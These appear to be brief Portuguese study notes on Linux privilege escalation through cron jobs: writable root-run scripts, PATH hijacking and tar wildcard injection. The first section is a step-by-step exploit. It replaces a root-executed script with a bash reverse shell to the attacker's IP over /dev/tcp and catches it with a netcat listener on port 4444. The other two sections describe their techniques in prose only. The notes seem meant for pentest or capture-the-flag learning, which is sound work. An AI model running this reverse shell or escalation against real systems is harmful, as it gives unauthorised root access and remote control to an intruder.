# File Permissions
``cat /etc/crontab`` vê os jobs configurados
se existirem jobs que executam arquivos como root e esses arquivos puderem ser editados pelo usuário podemos explora-los para criar uma reverse shell

## Exemplo
1. ``locate overwrite.sh`` arquivo que vai ser executado como root no job cron
2. ``ls -l /usr/local/bin/overwrite.sh`` checa se o arquivo é editável
3. troque o interior do arquivo por: 
```
#!/bin/bash  
bash -i >& /dev/tcp/ip-da-sua-maquina/porta 0>&1
```
4. só setar o listener na máquina atacante agora com ``nc -nvlp 4444``

# PATH Environment Variable
Essa elevação de privilégio (_privesc_) aproveita a ordem de prioridade da variável de ambiente **PATH**. A ideia é que, caso o arquivo original esteja inacessível, podemos criar um arquivo com o mesmo nome (contendo nosso código).

# Cron Jobs - Wildcards
Quando o comando `tar` no _cron job_ for executado, o curinga (`*`) será expandido para incluir esses arquivos. Como seus nomes são opções válidas da linha de comando do `tar`, o `tar` os reconhecerá dessa forma e os tratará como opções de linha de comando em vez de nomes de arquivos.


